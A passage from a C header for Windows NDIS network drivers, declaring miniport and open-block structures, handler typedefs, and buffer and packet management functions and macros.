  NDIS_WM_SEND_COMPLETE_HANDLER  WanSendCompleteHandler;
  WAN_RCV_HANDLER  WanRcvHandler;
  WAN_RCV_COMPLETE_HANDLER  WanRcvCompleteHandler;
#if defined(NDIS_WRAPPER)
  PNDIS_MINIPORT_BLOCK  NextGlobalMiniport;
  SINGLE_LIST_ENTRY  WorkQueue[NUMBER_OF_WORK_ITEM_TYPES];
  SINGLE_LIST_ENTRY  SingleWorkItems[NUMBER_OF_SINGLE_WORK_ITEMS];
  UCHAR  SendFlags;
  UCHAR  TrResetRing;
  UCHAR  ArcnetAddress;
  UCHAR  XState;
  _ANONYMOUS_UNION union {
#if ARCNET
    PNDIS_ARC_BUF  ArcBuf;
#endif
    PVOID  BusInterface;
  } DUMMYUNIONNAME;
  PNDIS_LOG  Log;
  ULONG  SlotNumber;
  PCM_RESOURCE_LIST  AllocatedResources;
  PCM_RESOURCE_LIST  AllocatedResourcesTranslated;
  SINGLE_LIST_ENTRY  PatternList;
  NDIS_PNP_CAPABILITIES  PMCapabilities;
  DEVICE_CAPABILITIES  DeviceCaps;
  ULONG  WakeUpEnable;
  DEVICE_POWER_STATE  CurrentDevicePowerState;
  PIRP  pIrpWaitWake;
  SYSTEM_POWER_STATE  WaitWakeSystemState;
  LARGE_INTEGER  VcIndex;
  KSPIN_LOCK  VcCountLock;
  LIST_ENTRY  WmiEnabledVcs;
  PNDIS_GUID  pNdisGuidMap;
  PNDIS_GUID  pCustomGuidMap;
  USHORT  VcCount;
  USHORT  cNdisGuidMap;
  USHORT  cCustomGuidMap;
  USHORT  CurrentMapRegister;
  PKEVENT  AllocationEvent;
  USHORT  BaseMapRegistersNeeded;
  USHORT  SGMapRegistersNeeded;
  ULONG  MaximumPhysicalMapping;
  NDIS_TIMER  MediaDisconnectTimer;
  USHORT  MediaDisconnectTimeOut;
  USHORT  InstanceNumber;
  NDIS_EVENT  OpenReadyEvent;
  NDIS_PNP_DEVICE_STATE  PnPDeviceState;
  NDIS_PNP_DEVICE_STATE  OldPnPDeviceState;
  PGET_SET_DEVICE_DATA  SetBusData;
  PGET_SET_DEVICE_DATA  GetBusData;
  KDPC  DeferredDpc;
#if 0
  /* FIXME: */
  NDIS_STATS  NdisStats;
#else
  ULONG  NdisStats;
#endif
  PNDIS_PACKET  IndicatedPacket[MAXIMUM_PROCESSORS];
  PKEVENT  RemoveReadyEvent;
  PKEVENT  AllOpensClosedEvent;
  PKEVENT  AllRequestsCompletedEvent;
  ULONG  InitTimeMs;
  NDIS_MINIPORT_WORK_ITEM  WorkItemBuffer[NUMBER_OF_SINGLE_WORK_ITEMS];
  PDMA_ADAPTER  SystemAdapterObject;
  ULONG  DriverVerifyFlags;
  POID_LIST  OidList;
  USHORT  InternalResetCount;
  USHORT  MiniportResetCount;
  USHORT  MediaSenseConnectCount;
  USHORT  MediaSenseDisconnectCount;
  PNDIS_PACKET  *xPackets;
  ULONG  UserModeOpenReferences;
  _ANONYMOUS_UNION union {
    PVOID  SavedSendHandler;
    PVOID  SavedWanSendHandler;
  } DUMMYUNIONNAME2;
  PVOID  SavedSendPacketsHandler;
  PVOID  SavedCancelSendPacketsHandler;
  W_SEND_PACKETS_HANDLER  WSendPacketsHandler;
  ULONG  MiniportAttributes;
  PDMA_ADAPTER  SavedSystemAdapterObject;
  USHORT  NumOpens;
  USHORT  CFHangXTicks;
  ULONG  RequestCount;
  ULONG  IndicatedPacketsCount;
  ULONG  PhysicalMediumType;
  PNDIS_REQUEST  LastRequest;
  LONG  DmaAdapterRefCount;
  PVOID  FakeMac;
  ULONG  LockDbg;
  ULONG  LockDbgX;
  PVOID  LockThread;
  ULONG  InfoFlags;
  KSPIN_LOCK  TimerQueueLock;
  PKEVENT  ResetCompletedEvent;
  PKEVENT  QueuedBindingCompletedEvent;
  PKEVENT  DmaResourcesReleasedEvent;
  FILTER_PACKET_INDICATION_HANDLER  SavedPacketIndicateHandler;
  ULONG  RegisteredInterrupts;
  PNPAGED_LOOKASIDE_LIST  SGListLookasideList;
  ULONG  ScatterGatherListSize;
#endif /* _NDIS_ */
};

#if NDIS_LEGACY_DRIVER

typedef NDIS_STATUS
(NTAPI *WAN_SEND_HANDLER)(
  IN NDIS_HANDLE MacBindingHandle,
  IN NDIS_HANDLE LinkHandle,
  IN PVOID Packet);

typedef VOID
(NTAPI *SEND_PACKETS_HANDLER)(
  IN NDIS_HANDLE MiniportAdapterContext,
  IN PPNDIS_PACKET PacketArray,
  IN UINT NumberOfPackets);

typedef NDIS_STATUS
(NTAPI *SEND_HANDLER)(
  IN NDIS_HANDLE NdisBindingHandle,
  IN PNDIS_PACKET Packet);

typedef NDIS_STATUS
(NTAPI *TRANSFER_DATA_HANDLER)(
  IN NDIS_HANDLE NdisBindingHandle,
  IN NDIS_HANDLE MacReceiveContext,
  IN UINT ByteOffset,
  IN UINT BytesToTransfer,
  OUT PNDIS_PACKET Packet,
  OUT PUINT BytesTransferred);

typedef NDIS_STATUS
(NTAPI *RESET_HANDLER)(
  IN NDIS_HANDLE NdisBindingHandle);

typedef NDIS_STATUS
(NTAPI *REQUEST_HANDLER)(
  IN NDIS_HANDLE NdisBindingHandle,
  IN PNDIS_REQUEST NdisRequest);

#endif /* NDIS_LEGACY_DRIVER */

#if defined(NDIS_WRAPPER)
#define NDIS_COMMON_OPEN_BLOCK_WRAPPER_S \
  ULONG Flags; \
  ULONG References; \
  KSPIN_LOCK SpinLock; \
  NDIS_HANDLE  FilterHandle; \
  ULONG  ProtocolOptions; \
  USHORT  CurrentLookahead; \
  USHORT  ConnectDampTicks; \
  USHORT  DisconnectDampTicks; \
  W_SEND_HANDLER  WSendHandler; \
  W_TRANSFER_DATA_HANDLER  WTransferDataHandler; \
  W_SEND_PACKETS_HANDLER  WSendPacketsHandler; \
  W_CANCEL_SEND_PACKETS_HANDLER  CancelSendPacketsHandler; \
  ULONG  WakeUpEnable; \
  PKEVENT  CloseCompleteEvent; \
  QUEUED_CLOSE  QC; \
  ULONG  AfReferences; \
  PNDIS_OPEN_BLOCK  NextGlobalOpen;
#else
#define NDIS_COMMON_OPEN_BLOCK_WRAPPER_S
#endif

#define NDIS_COMMON_OPEN_BLOCK_S \
  PVOID  MacHandle; \
  NDIS_HANDLE  BindingHandle; \
  PNDIS_MINIPORT_BLOCK  MiniportHandle; \
  PNDIS_PROTOCOL_BLOCK  ProtocolHandle; \
  NDIS_HANDLE  ProtocolBindingContext; \
  PNDIS_OPEN_BLOCK  MiniportNextOpen; \
  PNDIS_OPEN_BLOCK  ProtocolNextOpen; \
  NDIS_HANDLE  MiniportAdapterContext; \
  BOOLEAN  Reserved1; \
  BOOLEAN  Reserved2; \
  BOOLEAN  Reserved3; \
  BOOLEAN  Reserved4; \
  PNDIS_STRING  BindDeviceName; \
  KSPIN_LOCK  Reserved5; \
  PNDIS_STRING  RootDeviceName; \
  _ANONYMOUS_UNION union { \
    SEND_HANDLER  SendHandler; \
    WAN_SEND_HANDLER  WanSendHandler; \
  } DUMMYUNIONNAME; \
  TRANSFER_DATA_HANDLER  TransferDataHandler; \
  SEND_COMPLETE_HANDLER  SendCompleteHandler; \
  TRANSFER_DATA_COMPLETE_HANDLER  TransferDataCompleteHandler; \
  RECEIVE_HANDLER  ReceiveHandler; \
  RECEIVE_COMPLETE_HANDLER  ReceiveCompleteHandler; \
  WAN_RECEIVE_HANDLER  WanReceiveHandler; \
  REQUEST_COMPLETE_HANDLER  RequestCompleteHandler; \
  RECEIVE_PACKET_HANDLER  ReceivePacketHandler; \
  SEND_PACKETS_HANDLER  SendPacketsHandler; \
  RESET_HANDLER  ResetHandler; \
  REQUEST_HANDLER  RequestHandler; \
  RESET_COMPLETE_HANDLER  ResetCompleteHandler; \
  STATUS_HANDLER  StatusHandler; \
  STATUS_COMPLETE_HANDLER  StatusCompleteHandler; \
  NDIS_COMMON_OPEN_BLOCK_WRAPPER_S

typedef struct _NDIS_COMMON_OPEN_BLOCK {
  NDIS_COMMON_OPEN_BLOCK_S
} NDIS_COMMON_OPEN_BLOCK;

struct _NDIS_OPEN_BLOCK
{
#ifdef __cplusplus
  NDIS_COMMON_OPEN_BLOCK NdisCommonOpenBlock;
#else
  NDIS_COMMON_OPEN_BLOCK_S
#endif
};

#include <xfilter.h>

#define NDIS_M_MAX_LOOKAHEAD           526

NDISAPI
VOID
NTAPI
NdisInitializeTimer(
  PNDIS_TIMER Timer,
  PNDIS_TIMER_FUNCTION TimerFunction,
  PVOID FunctionContext);

NDISAPI
VOID
NTAPI
NdisCancelTimer(
  PNDIS_TIMER Timer,
  PBOOLEAN TimerCancelled);

NDISAPI
VOID
NTAPI
NdisSetTimer(
  PNDIS_TIMER Timer,
  UINT MillisecondsToDelay);

NDISAPI
VOID
NTAPI
NdisSetPeriodicTimer(
  PNDIS_TIMER NdisTimer,
  UINT MillisecondsPeriod);

NDISAPI
VOID
NTAPI
NdisSetTimerEx(
  PNDIS_TIMER NdisTimer,
  UINT MillisecondsToDelay,
  PVOID FunctionContext);

NDISAPI
PVOID
NTAPI
NdisGetRoutineAddress(
  PNDIS_STRING NdisRoutineName);

NDISAPI
UINT
NTAPI
NdisGetVersion(VOID);

#if NDIS_LEGACY_DRIVER

NDISAPI
VOID
NTAPI
NdisAllocateBuffer(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_BUFFER *Buffer,
  IN NDIS_HANDLE PoolHandle OPTIONAL,
  IN PVOID VirtualAddress,
  IN UINT Length);

NDISAPI
VOID
NTAPI
NdisAllocateBufferPool(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_HANDLE PoolHandle,
  IN UINT NumberOfDescriptors);

NDISAPI
VOID
NTAPI
NdisFreeBufferPool(
  IN NDIS_HANDLE PoolHandle);

/*
NDISAPI
VOID
NTAPI
NdisFreeBuffer(
  IN PNDIS_BUFFER Buffer);
*/
#define NdisFreeBuffer IoFreeMdl

NDISAPI
VOID
NTAPI
NdisAllocatePacketPool(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_HANDLE PoolHandle,
  IN UINT NumberOfDescriptors,
  IN UINT ProtocolReservedLength);

NDISAPI
VOID
NTAPI
NdisAllocatePacketPoolEx(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_HANDLE PoolHandle,
  IN UINT NumberOfDescriptors,
  IN UINT NumberOfOverflowDescriptors,
  IN UINT ProtocolReservedLength);

NDISAPI
VOID
NTAPI
NdisSetPacketPoolProtocolId(
  IN NDIS_HANDLE PacketPoolHandle,
  IN UINT ProtocolId);

NDISAPI
UINT
NTAPI
NdisPacketPoolUsage(
  IN NDIS_HANDLE PoolHandle);

NDISAPI
UINT
NTAPI
NdisPacketSize(
  IN UINT ProtocolReservedSize);

NDISAPI
NDIS_HANDLE
NTAPI
NdisGetPoolFromPacket(
  IN PNDIS_PACKET Packet);

NDISAPI
PNDIS_PACKET_STACK
NTAPI
NdisIMGetCurrentPacketStack(
  IN PNDIS_PACKET Packet,
  OUT BOOLEAN * StacksRemaining);

NDISAPI
VOID
NTAPI
NdisFreePacketPool(
  IN NDIS_HANDLE PoolHandle);

NDISAPI
VOID
NTAPI
NdisFreePacket(
  IN PNDIS_PACKET Packet);

NDISAPI
VOID
NTAPI
NdisDprFreePacket(
  IN PNDIS_PACKET Packet);

NDISAPI
VOID
NTAPI
NdisDprFreePacketNonInterlocked(
  IN PNDIS_PACKET Packet);

NDISAPI
VOID
NTAPI
NdisAllocatePacket(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_PACKET *Packet,
  IN NDIS_HANDLE PoolHandle);

NDISAPI
VOID
NTAPI
NdisDprAllocatePacket(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_PACKET *Packet,
  IN NDIS_HANDLE PoolHandle);

NDISAPI
VOID
NTAPI
NdisDprAllocatePacketNonInterlocked(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_PACKET *Packet,
  IN NDIS_HANDLE PoolHandle);

/*
 * VOID
 * NdisReinitializePacket(
 *   IN OUT  PNDIS_PACKET  Packet);
 */
#define NdisReinitializePacket(Packet) {        \
  (Packet)->Private.Head = (PNDIS_BUFFER)NULL;  \
  (Packet)->Private.ValidCounts = FALSE;        \
}

/*
NDISAPI
VOID
NTAPI
NdisQueryBuffer(
  IN PNDIS_BUFFER Buffer,
  OUT PVOID *VirtualAddress OPTIONAL,
  OUT PUINT Length);
*/
#define NdisQueryBuffer(_Buffer, _VirtualAddress, _Length) {         \
  if (ARGUMENT_PRESENT(_VirtualAddress)) {                           \
    *(PVOID *)(_VirtualAddress) = MmGetSystemAddressForMdl(_Buffer); \
  }                                                                  \
  *(_Length) = MmGetMdlByteCount(_Buffer);                           \
}

NDISAPI
VOID
NTAPI
NdisGetFirstBufferFromPacket(
  IN PNDIS_PACKET _Packet,
  OUT PNDIS_BUFFER *_FirstBuffer,
  OUT PVOID *_FirstBufferVA,
  OUT PUINT _FirstBufferLength,
  OUT PUINT _TotalBufferLength);

/*
 * VOID
 * NdisGetFirstBufferFromPacketSafe(
 * IN PNDIS_PACKET _Packet,
 * OUT PNDIS_BUFFER * _FirstBuffer,
 * OUT PVOID * _FirstBufferVA,
 * OUT PUINT _FirstBufferLength,
 * OUT PUINT _TotalBufferLength),
 * IN MM_PAGE_PRIORITY _Priority)
 */
#define NdisGetFirstBufferFromPacketSafe(_Packet,                             \
                                     _FirstBuffer,                            \
                                     _FirstBufferVA,                          \
                                     _FirstBufferLength,                      \
                                     _TotalBufferLength,                      \
                                     _Priority)                               \
{                                                                             \
  PNDIS_BUFFER _Buffer;                                                       \
                                                                              \
  _Buffer         = (_Packet)->Private.Head;                                  \
  *(_FirstBuffer) = _Buffer;                                                  \
  if (_Buffer != NULL) {                                                      \
    *(_FirstBufferVA)     = MmGetSystemAddressForMdlSafe(_Buffer, _Priority); \
    *(_FirstBufferLength) = MmGetMdlByteCount(_Buffer);                       \
    _Buffer = _Buffer->Next;                                                  \
    *(_TotalBufferLength) = *(_FirstBufferLength);                            \
    while (_Buffer != NULL) {                                                 \
      *(_TotalBufferLength) += MmGetMdlByteCount(_Buffer);                    \
      _Buffer = _Buffer->Next;                                                \
    }                                                                         \
  }                                                                           \
  else {                                                                      \
    *(_FirstBufferVA) = 0;                                                    \
    *(_FirstBufferLength) = 0;                                                \
    *(_TotalBufferLength) = 0;                                                \
  }                                                                           \
}

/*
 * VOID
 * NdisRecalculatePacketCounts(
 *   IN OUT PNDIS_PACKET Packet);
 */
#define NdisRecalculatePacketCounts(Packet) {     \
  PNDIS_BUFFER _Buffer = (Packet)->Private.Head;  \
  if (_Buffer != NULL) {                          \
    while (_Buffer->Next != NULL) {               \
      _Buffer = _Buffer->Next;                    \
    }                                             \
    (Packet)->Private.Tail = _Buffer;             \
  }                                               \
  (Packet)->Private.ValidCounts = FALSE;          \
}

/*
 * VOID
 * NdisChainBufferAtFront(
 *   IN OUT PNDIS_PACKET Packet,
 *   IN OUT PNDIS_BUFFER Buffer)
 */
#define NdisChainBufferAtFront(Packet,        \
                               Buffer)        \
{                                             \
  PNDIS_BUFFER _NdisBuffer = (Buffer);        \
                                              \
  while (_NdisBuffer->Next != NULL)           \
    _NdisBuffer = _NdisBuffer->Next;          \
                                              \
  if ((Packet)->Private.Head == NULL)         \
    (Packet)->Private.Tail = _NdisBuffer;     \
                                              \
  _NdisBuffer->Next = (Packet)->Private.Head; \
  (Packet)->Private.Head = (Buffer);          \
  (Packet)->Private.ValidCounts = FALSE;      \
}

/*
 * VOID
 * NdisChainBufferAtBack(
 *   IN OUT PNDIS_PACKET Packet,
 *   IN OUT PNDIS_BUFFER Buffer)
 */
#define NdisChainBufferAtBack(Packet,           \
                              Buffer)           \
{                                               \
  PNDIS_BUFFER _NdisBuffer = (Buffer);          \
                                                \
  while (_NdisBuffer->Next != NULL)             \
    _NdisBuffer = _NdisBuffer->Next;            \
                                                \
  _NdisBuffer->Next = NULL;                     \
                                                \
  if ((Packet)->Private.Head != NULL)           \
    (Packet)->Private.Tail->Next = (Buffer);    \
  else                                          \
    (Packet)->Private.Head = (Buffer);          \
                                                \
  (Packet)->Private.Tail = _NdisBuffer;         \
  (Packet)->Private.ValidCounts = FALSE;        \
}

NDISAPI
VOID
NTAPI
NdisUnchainBufferAtFront(
  IN OUT PNDIS_PACKET Packet,
  OUT PNDIS_BUFFER *Buffer);

NDISAPI
VOID
NTAPI
NdisUnchainBufferAtBack(
  IN OUT PNDIS_PACKET Packet,
  OUT PNDIS_BUFFER *Buffer);

NDISAPI
VOID
NTAPI
NdisCopyFromPacketToPacket(
  IN PNDIS_PACKET Destination,
  IN UINT DestinationOffset,
  IN UINT BytesToCopy,
  IN PNDIS_PACKET Source,
  IN UINT SourceOffset,
  OUT PUINT BytesCopied);

NDISAPI
VOID
NTAPI
NdisCopyFromPacketToPacketSafe(
  IN PNDIS_PACKET Destination,
  IN UINT DestinationOffset,
  IN UINT BytesToCopy,
  IN PNDIS_PACKET Source,
  IN UINT SourceOffset,
  OUT PUINT BytesCopied,
  IN MM_PAGE_PRIORITY Priority);

NDISAPI
NDIS_STATUS
NTAPI
NdisAllocateMemory(
  OUT PVOID *VirtualAddress,
  IN UINT Length,
  IN UINT MemoryFlags,
  IN NDIS_PHYSICAL_ADDRESS HighestAcceptableAddress);

#define NdisInitializeWorkItem(_WI_, _R_, _C_) { \
  (_WI_)->Context = _C_;                         \
  (_WI_)->Routine = _R_;                         \
}

NDISAPI
NDIS_STATUS
NTAPI
NdisScheduleWorkItem(
  IN PNDIS_WORK_ITEM WorkItem);

NDISAPI
VOID
NTAPI
NdisSetPacketStatus(
  IN PNDIS_PACKET Packet,
  IN NDIS_STATUS Status,
  IN NDIS_HANDLE Handle,
  IN ULONG Code);

#endif /* NDIS_LEGACY_DRIVER */

NDISAPI
VOID
NTAPI
NdisOpenFile(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_HANDLE FileHandle,
  OUT PUINT FileLength,
  IN PNDIS_STRING FileName,
  IN NDIS_PHYSICAL_ADDRESS HighestAcceptableAddress);

NDISAPI
VOID
NTAPI
NdisCloseFile(
  IN NDIS_HANDLE FileHandle);

NDISAPI
VOID
NTAPI
NdisMapFile(
  OUT PNDIS_STATUS Status,
  OUT PVOID *MappedBuffer,
  IN NDIS_HANDLE FileHandle);

NDISAPI
VOID
NTAPI
NdisUnmapFile(
  IN NDIS_HANDLE FileHandle);

NDISAPI
ULONG
NTAPI
NdisGetSharedDataAlignment(VOID);

#define NdisFlushBuffer(Buffer,WriteToDevice) \
  KeFlushIoBuffers((Buffer),!(WriteToDevice), TRUE)

NDISAPI
VOID
NTAPI
NdisCopyBuffer(
  OUT PNDIS_STATUS Status,
  OUT PNDIS_BUFFER *Buffer,
  IN NDIS_HANDLE PoolHandle,
  IN PVOID MemoryDescriptor,
  IN UINT Offset,
  IN UINT Length);

/*
 * VOID
 * NdisCopyLookaheadData(
 *   IN PVOID Destination,
 *   IN PVOID Source,
 *   IN ULONG Length,
 *   IN ULONG ReceiveFlags);
 */

#if defined(_M_IX86) || defined(_M_AMD64)
#define NdisCopyLookaheadData(Destination, Source, Length, MacOptions) \
  RtlCopyMemory(Destination, Source, Length)
#else
#define NdisCopyLookaheadData(Destination, Source, Length, MacOptions) \
  { \
    if ((MacOptions) & NDIS_MAC_OPTION_COPY_LOOKAHEAD_DATA) \
    { \
      RtlCopyMemory(_Destination, _Source, _Length); \
    } \
    else \
    { \
      PUCHAR _Src = (PUCHAR)(Source); \
      PUCHAR _Dest = (PUCHAR)(Destination); \
      PUCHAR _End = _Dest + (Length); \
      while (_Dest < _End) \
        *_Dest++ = *_Src++; \
    } \
  }
#endif

/*
NDISAPI
VOID
NTAPI
NdisAdjustBufferLength(
  IN PNDIS_BUFFER Buffer,
  IN UINT Length);
*/
#define NdisAdjustBufferLength(Buffer, Length) \
  (((Buffer)->ByteCount) = (Length))

#if NDIS_SUPPORT_NDIS6
#define NdisAdjustMdlLength(_Mdl, _Length) \
  (((_Mdl)->ByteCount) = (_Length))
#endif

/*
NDISAPI
ULONG
NTAPI
NdisBufferLength(
  IN PNDIS_BUFFER Buffer);
*/
#define NdisBufferLength MmGetMdlByteCount

/*
NDISAPI
PVOID
NTAPI
NdisBufferVirtualAddress(
  IN PNDIS_BUFFER Buffer);
*/
#define NdisBufferVirtualAddress MmGetSystemAddressForMdl

#define NdisBufferVirtualAddressSafe MmGetSystemAddressForMdlSafe

NDISAPI
ULONG
NTAPI
NDIS_BUFFER_TO_SPAN_PAGES(
  IN PNDIS_BUFFER Buffer);

/*
NDISAPI
VOID
NTAPI
NdisGetBufferPhysicalArraySize(
  IN PNDIS_BUFFER Buffer,
  OUT PUINT ArraySize);
*/
#define NdisGetBufferPhysicalArraySize(Buffer, ArraySize) \
  (*(ArraySize) = NDIS_BUFFER_TO_SPAN_PAGES(Buffer))

/*
NDISAPI
VOID
NTAPI
NdisQueryBufferOffset(
  IN PNDIS_BUFFER Buffer,
  OUT PUINT Offset,
  OUT PUINT Length);
*/
#define NdisQueryBufferOffset(_Buffer, _Offset, _Length) { \
  *(_Offset) = MmGetMdlByteOffset(_Buffer);                \
  *(_Length) = MmGetMdlByteCount(_Buffer);                 \
}

/*
 * PVOID
 * NDIS_BUFFER_LINKAGE(
 *   IN PNDIS_BUFFER Buffer);
 */
#define NDIS_BUFFER_LINKAGE(Buffer) (Buffer)->Next

/*
 * VOID
 * NdisGetNextBuffer(
 *   IN PNDIS_BUFFER CurrentBuffer,
 *   OUT PNDIS_BUFFER * NextBuffer)
 */
#define NdisGetNextBuffer(CurrentBuffer,  \
                          NextBuffer)     \
{                                         \
  *(NextBuffer) = (CurrentBuffer)->Next;  \
}

#if NDIS_LEGACY_DRIVER

#define NDIS_PACKET_FIRST_NDIS_BUFFER(_Packet) ((_Packet)->Private.Head)
#define NDIS_PACKET_LAST_NDIS_BUFFER(_Packet) ((_Packet)->Private.Tail)
#define NDIS_PACKET_VALID_COUNTS(_Packet) ((_Packet)->Private.ValidCounts)

/*
 * UINT
 * NdisGetPacketFlags(
 *   IN PNDIS_PACKET  Packet);
 */
#define NdisGetPacketFlags(Packet) (Packet)->Private.Flags

/*
 * ULONG
 * NDIS_GET_PACKET_PROTOCOL_TYPE(
 *   IN PNDIS_PACKET Packet);
 */
#define NDIS_GET_PACKET_PROTOCOL_TYPE(_Packet) \
  ((_Packet)->Private.Flags & NDIS_PROTOCOL_ID_MASK)

/*
 * PNDIS_PACKET_OOB_DATA
 * NDIS_OOB_DATA_FROM_PACKET(
 *   IN PNDIS_PACKET Packet);
 */
#define NDIS_OOB_DATA_FROM_PACKET(_Packet)    \
  (PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) + \
  (_Packet)->Private.NdisPacketOobOffset)

/*
 * ULONG
 * NDIS_GET_PACKET_HEADER_SIZE(
 *   IN PNDIS_PACKET Packet);
 */
#define NDIS_GET_PACKET_HEADER_SIZE(_Packet)   \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) + \
  (_Packet)->Private.NdisPacketOobOffset))->HeaderSize

/*
 * NDIS_STATUS
 * NDIS_GET_PACKET_STATUS(
 *   IN PNDIS_PACKET Packet);
 */
#define NDIS_GET_PACKET_STATUS(_Packet)        \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) + \
  (_Packet)->Private.NdisPacketOobOffset))->Status

/*
 * ULONGLONG
 * NDIS_GET_PACKET_TIME_TO_SEND(
 *   IN PNDIS_PACKET Packet);
 */
#define NDIS_GET_PACKET_TIME_TO_SEND(_Packet)   \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +  \
  (_Packet)->Private.NdisPacketOobOffset))->TimeToSend

/*
 * ULONGLONG
 * NDIS_GET_PACKET_TIME_SENT(
 *   IN PNDIS_PACKET Packet);
 */
#define NDIS_GET_PACKET_TIME_SENT(_Packet)      \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +  \
  (_Packet)->Private.NdisPacketOobOffset))->TimeSent

/*
 * ULONGLONG
 * NDIS_GET_PACKET_TIME_RECEIVED(
 *   IN PNDIS_PACKET Packet);
 */
#define NDIS_GET_PACKET_TIME_RECEIVED(_Packet)  \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +  \
  (_Packet)->Private.NdisPacketOobOffset))->TimeReceived

/*
 * VOID
 * NDIS_GET_PACKET_MEDIA_SPECIFIC_INFO(
 *   IN PNDIS_PACKET Packet,
 *   IN PPVOID pMediaSpecificInfo,
 *   IN PUINT pSizeMediaSpecificInfo);
 */
#define NDIS_GET_PACKET_MEDIA_SPECIFIC_INFO(_Packet,                                  \
                                            _pMediaSpecificInfo,                      \
                                            _pSizeMediaSpecificInfo)                  \
{                                                                                     \
  if (!((_Packet)->Private.NdisPacketFlags & fPACKET_ALLOCATED_BY_NDIS) ||            \
      !((_Packet)->Private.NdisPacketFlags & fPACKET_CONTAINS_MEDIA_SPECIFIC_INFO))   \
    {                                                                                 \
      *(_pMediaSpecificInfo) = NULL;                                                  \
      *(_pSizeMediaSpecificInfo) = 0;                                                 \
    }                                                                                 \
  else                                                                                \
    {                                                                                 \
      *(_pMediaSpecificInfo) = ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +           \
        (_Packet)->Private.NdisPacketOobOffset))->MediaSpecificInformation;           \
      *(_pSizeMediaSpecificInfo) = ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +       \
        (_Packet)->Private.NdisPacketOobOffset))->SizeMediaSpecificInfo;              \
    }                                                                                 \
}

/*
 * VOID
 * NDIS_SET_PACKET_HEADER_SIZE(
 *   IN PNDIS_PACKET Packet,
 *   IN UINT HdrSize);
 */
#define NDIS_SET_PACKET_HEADER_SIZE(_Packet, _HdrSize)              \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +                      \
  (_Packet)->Private.NdisPacketOobOffset))->HeaderSize = (_HdrSize)

/*
 * VOID
 * NDIS_SET_PACKET_STATUS(
 *   IN PNDIS_PACKET Packet,
 *   IN NDIS_STATUS Status);
 */
#define NDIS_SET_PACKET_STATUS(_Packet, _Status)  \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +    \
  (_Packet)->Private.NdisPacketOobOffset))->Status = (_Status)

/*
 * VOID
 * NDIS_SET_PACKET_TIME_TO_SEND(
 *   IN PNDIS_PACKET Packet,
 *   IN ULONGLONG TimeToSend);
 */
#define NDIS_SET_PACKET_TIME_TO_SEND(_Packet, _TimeToSend)  \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +              \
  (_Packet)->Private.NdisPacketOobOffset))->TimeToSend = (_TimeToSend)

/*
 * VOID
 * NDIS_SET_PACKET_TIME_SENT(
 *   IN PNDIS_PACKET Packet,
 *   IN ULONGLONG TimeSent);
 */
#define NDIS_SET_PACKET_TIME_SENT(_Packet, _TimeSent) \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +        \
  (_Packet)->Private.NdisPacketOobOffset))->TimeSent = (_TimeSent)

/*
 * VOID
 * NDIS_SET_PACKET_TIME_RECEIVED(
 *   IN PNDIS_PACKET Packet,
 *   IN ULONGLONG TimeReceived);
 */
#define NDIS_SET_PACKET_TIME_RECEIVED(_Packet, _TimeReceived) \
  ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +                \
  (_Packet)->Private.NdisPacketOobOffset))->TimeReceived = (_TimeReceived)

/*
 * VOID
 * NDIS_SET_PACKET_MEDIA_SPECIFIC_INFO(
 *   IN PNDIS_PACKET Packet,
 *   IN PVOID MediaSpecificInfo,
 *   IN UINT SizeMediaSpecificInfo);
 */
#define NDIS_SET_PACKET_MEDIA_SPECIFIC_INFO(_Packet,                      \
                                            _MediaSpecificInfo,           \
                                            _SizeMediaSpecificInfo)       \
{                                                                         \
  if ((_Packet)->Private.NdisPacketFlags & fPACKET_ALLOCATED_BY_NDIS)     \
    {                                                                     \
      (_Packet)->Private.NdisPacketFlags |= fPACKET_CONTAINS_MEDIA_SPECIFIC_INFO; \
      ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +                        \
        (_Packet)->Private.NdisPacketOobOffset))->MediaSpecificInformation = \
          (_MediaSpecificInfo);                                           \
      ((PNDIS_PACKET_OOB_DATA)((PUCHAR)(_Packet) +                        \
        (_Packet)->Private.NdisPacketOobOffset))->SizeMediaSpecificInfo = \
          (_SizeMediaSpecificInfo);                                       \
    }                                                                     \
}

/*
 * VOID
 * NdisSetPacketFlags(
 *   IN PNDIS_PACKET  Packet,
 *   IN UINT  Flags);
 */
#define NdisSetPacketFlags(Packet, Flags) (Packet)->Private.Flags |= (Flags)

/*
 * VOID
 * NdisClearPacketFlags(
 *   IN PNDIS_PACKET  Packet,
 *   IN UINT  Flags);
 */
#define NdisClearPacketFlags(Packet, Flags) (Packet)->Private.Flags &= ~(Flags)

/*
 * VOID
 * NdisQueryPacket(
 *   IN PNDIS_PACKET Packet,
 *   OUT PUINT PhysicalBufferCount OPTIONAL,
 *   OUT PUINT BufferCount OPTIONAL,
 *   OUT PNDIS_BUFFER *FirstBuffer OPTIONAL,
 *   OUT PUINT TotalPacketLength OPTIONAL);
 */
static __inline
VOID
NdisQueryPacket(
  IN PNDIS_PACKET Packet,
  OUT PUINT PhysicalBufferCount OPTIONAL,
  OUT PUINT BufferCount OPTIONAL,
  OUT PNDIS_BUFFER *FirstBuffer OPTIONAL,
  OUT PUINT TotalPacketLength OPTIONAL)
{
  if (FirstBuffer)
    *FirstBuffer = Packet->Private.Head;
  if (TotalPacketLength || BufferCount || PhysicalBufferCount) {
    if (!Packet->Private.ValidCounts) {
      UINT Offset;
      UINT PacketLength;
